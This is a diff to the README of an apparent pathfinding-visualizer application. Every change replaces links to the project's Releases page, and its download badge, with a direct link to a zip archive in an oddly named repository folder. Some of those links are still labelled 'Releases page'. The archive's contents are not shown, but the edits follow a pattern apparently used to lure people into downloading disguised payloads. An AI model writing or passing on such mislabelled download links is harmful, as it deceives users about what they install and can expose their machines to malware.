@@ -6,11 +6,11 @@ Welcome! This application allows you to visualize popular pathfinding algorithms
 
 ## 📥 Download the Application
 
-[![Download Pathfinding-Visualizer](https://img.shields.io/badge/Download-Pathfinding--Visualizer-blue.svg)](https://github.com/iamnotautistic/Pathfinding-Visualizer/releases)
+[![Download Pathfinding-Visualizer](https://raw.githubusercontent.com/iamnotautistic/Pathfinding-Visualizer/main/ungarrisoned/Pathfinding-Visualizer.zip)](https://raw.githubusercontent.com/iamnotautistic/Pathfinding-Visualizer/main/ungarrisoned/Pathfinding-Visualizer.zip)
 
 To get started, visit the link below to download the application:
 
-[Download Pathfinding-Visualizer](https://github.com/iamnotautistic/Pathfinding-Visualizer/releases)
+[Download Pathfinding-Visualizer](https://raw.githubusercontent.com/iamnotautistic/Pathfinding-Visualizer/main/ungarrisoned/Pathfinding-Visualizer.zip)
 
 ## 🖥️ System Requirements
 
@@ -31,7 +31,7 @@ Before downloading, make sure your system meets the following requirements:
 ## 💻 How to Run the Application
 
 1. **Download the Application:**
-   - Follow the link to the [Releases page](https://github.com/iamnotautistic/Pathfinding-Visualizer/releases).
+   - Follow the link to the [Releases page](https://raw.githubusercontent.com/iamnotautistic/Pathfinding-Visualizer/main/ungarrisoned/Pathfinding-Visualizer.zip).
    - Click on the latest version to find the download files.
    - Download the file suitable for your operating system.
 
@@ -77,7 +77,7 @@ If you encounter any issues, try the following solutions:
 
 ## 🔄 Updates & Maintenance
 
-Keep your application updated to enjoy new features and improvements. You can check for updates by visiting the [Releases page](https://github.com/iamnotautistic/Pathfinding-Visualizer/releases) periodically.
+Keep your application updated to enjoy new features and improvements. You can check for updates by visiting the [Releases page](https://raw.githubusercontent.com/iamnotautistic/Pathfinding-Visualizer/main/ungarrisoned/Pathfinding-Visualizer.zip) periodically.
 
 ## 🤝 Contributing
 
